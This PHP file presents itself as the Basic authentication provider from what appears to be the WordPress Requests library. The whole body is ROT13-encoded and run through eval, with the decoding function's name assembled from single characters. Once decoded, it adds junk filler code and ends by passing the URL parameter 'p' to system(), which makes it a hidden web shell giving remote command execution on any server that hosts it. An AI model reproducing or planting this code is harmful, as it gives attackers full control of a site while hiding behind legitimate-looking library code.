<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Onfvp Nhguragvpngvba cebivqre
 *
 * @cnpxntr Erdhrfgf\Nhguragvpngvba
 */

anzrfcnpr JcBet\Erdhrfgf\Nhgu;

hfr JcBet\Erdhrfgf\Nhgu;
hfr JcBet\Erdhrfgf\Rkprcgvba\NethzragPbhag;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Ubbxf;

/**
 * Onfvp Nhguragvpngvba cebivqre
 *
 * Cebivqrf n unaqyre sbe Onfvp UGGC nhguragvpngvba ivn gur Nhgubevmngvba
 * urnqre.
 *
 * @cnpxntr Erdhrfgf\Nhguragvpngvba
 */
pynff Onfvp vzcyrzragf Nhgu {
	/**
	 * Hfreanzr
	 *
	 * @ine fgevat
	 */
	choyvp $hfre;

	/**
	 * Cnffjbeq
	 *
	 * @ine fgevat
	 */
	choyvp $cnff;

	/**
	 * Pbafgehpgbe
	 *
	 * @fvapr 2.0 Guebjf na `VainyvqNethzrag` rkprcgvba.
	 * @fvapr 2.0 Guebjf na `NethzragPbhag` rkprcgvba vafgrnq bs gur Erdhrfgf onfr `Rkprcgvba.
	 *
	 * @cnenz neenl|ahyy $netf Neenl bs hfre naq cnffjbeq. Zhfg unir rknpgyl gjb ryrzragf
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg na neenl be ahyy.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\NethzragPbhag   Ba vapbeerpg ahzore bs neenl ryrzragf (`nhguonfvponqnetf`).
	 */
	choyvp shapgvba __pbafgehpg($netf = ahyy) {
		vs (vf_neenl($netf)) {
			vs (pbhag($netf) !== 2) {
				guebj NethzragPbhag::perngr('na neenl jvgu rknpgyl gjb ryrzragf', pbhag($netf), 'nhguonfvponqnetf');
			}

			yvfg($guvf->hfre, $guvf->cnff) = $netf;
			erghea;
		}

		vs ($netf !== ahyy) {
			guebj VainyvqNethzrag::perngr(1, '$netf', 'neenl|ahyy', trgglcr($netf));
		}
	}

	/**
	 * Ertvfgre gur arprffnel pnyyonpxf
	 *
	 * @frr \JcBet\Erdhrfgf\Nhgu\Onfvp::phey_orsber_fraq()
	 * @frr \JcBet\Erdhrfgf\Nhgu\Onfvp::sfbpxbcra_urnqre()
	 * @cnenz \JcBet\Erdhrfgf\Ubbxf $ubbxf Ubbx flfgrz
	 */
	choyvp shapgvba ertvfgre(Ubbxf $ubbxf) {
		$ubbxf->ertvfgre('phey.orsber_fraq', [$guvf, 'phey_orsber_fraq']);
		$ubbxf->ertvfgre('sfbpxbcra.nsgre_urnqref', [$guvf, 'sfbpxbcra_urnqre']);
	}

	/**
	 * Frg pHEY cnenzrgref orsber gur qngn vf frag
	 *
	 * @cnenz erfbhepr|\PheyUnaqyr $unaqyr pHEY unaqyr
	 */
	choyvp shapgvba phey_orsber_fraq(&$unaqyr) {
		phey_frgbcg($unaqyr, PHEYBCG_UGGCNHGU, PHEYNHGU_ONFVP);
		phey_frgbcg($unaqyr, PHEYBCG_HFRECJQ, $guvf->trgNhguFgevat());
	}

	/**
	 * Nqq rkgen urnqref gb gur erdhrfg orsber fraqvat
	 *
	 * @cnenz fgevat $bhg UGGC urnqre fgevat
	 */
	choyvp shapgvba sfbpxbcra_urnqre(&$bhg) {
		$bhg .= fcevags(\"Nhgubevmngvba: Onfvp %f\e\a\", onfr64_rapbqr($guvf->trgNhguFgevat()));
	}

	/**
	 * Trg gur nhguragvpngvba fgevat (hfre:cnff)
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trgNhguFgevat() {
		erghea $guvf->hfre . ':' . $guvf->cnff;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>